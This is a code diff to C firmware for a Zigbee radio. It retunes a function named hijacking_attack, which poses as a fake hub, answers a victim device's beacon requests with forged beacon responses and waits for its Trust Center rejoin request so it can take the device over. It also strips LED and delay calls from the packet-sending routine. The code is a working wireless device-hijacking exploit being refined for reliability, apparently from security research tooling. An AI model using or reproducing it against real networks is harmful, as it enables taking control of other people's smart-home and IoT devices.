@@ -86,8 +86,6 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 				   ieee802154_addr* dst_addr, ieee802154_addr* src_addr,
 				   rx_aack_config* aack_config)
 {
-	led(1);
-	DELAY_1;
 	uint8_t reg_status = 0;
 	change_state(TRX_CMD_FORCE_PLL_ON);
 	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON) {
@@ -132,8 +130,6 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 		change_state(TRX_CMD_RX_ON);
 		// change_state(TRX_CMD_PLL_ON);
 	}
-	led(0);
-	DELAY_1;
 }
 
 static uint8_t spi_send_blocks(void *data, uint8_t size)
@@ -280,12 +276,14 @@ uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr
 	aack_config.target_short_addr.addr = fake_hub_addr.short_addr;
 	aack_config.target_pan_id.addr = fake_hub_addr.pan;
 	// Detect TC rejoin request and Data Request, and turn on AACK
-	tc_rejoin_request_flag = 0;
+	
+	beacon_request_flag = 0;
 	while(!beacon_request_flag)
 	{
-		_delay_us(5);
+		_delay_us(50);
 	}
 	send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0,victim_addr, &fake_hub_addr, &aack_config);
+	tc_rejoin_request_flag = 0;
 	while(!tc_rejoin_request_flag)
 	{
 		// Detect Beacon Request and Reply with Beacon Response
@@ -296,7 +294,7 @@ uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr
 		}
 		send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0,victim_addr, &fake_hub_addr, &aack_config);
 		// Wait for TC Rejoin Request
-		_delay_us(20);
+		_delay_us(5);
 	}
 	aack_config.aack_flag = 1;
 	// 4. Detect Data Request and Send Rejoin Response Command.
